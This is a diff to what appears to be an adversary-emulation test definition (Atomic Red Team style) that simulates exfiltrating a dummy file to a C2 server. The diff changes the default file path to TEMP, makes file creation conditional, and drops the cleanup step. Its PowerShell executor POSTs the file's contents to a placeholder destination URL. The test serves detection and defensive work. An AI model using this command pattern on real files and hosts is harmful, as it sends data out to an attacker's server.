@@ -15,14 +15,13 @@ atomic_tests:
     filepath:
       description: The file which is being exfiltrated to the C2 Server.
       type: Path
-      default: C:\Users\$env:UserName\LineNumbers.txt
+      default: $env:TEMP\LineNumbers.txt
   executor:
     command: |
-     echo "Creating file to be exfiltrated" 
-     1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
+     if(-not (Test-Path #{filepath})){ 
+       1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
+     }
      [System.Net.ServicePointManager]::Expect100Continue = $false
      $filecontent = Get-Content -Path #{filepath}
      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
-    cleanup_command: |
-     Remove-item -Force -path #{filepath}
     name: powershell
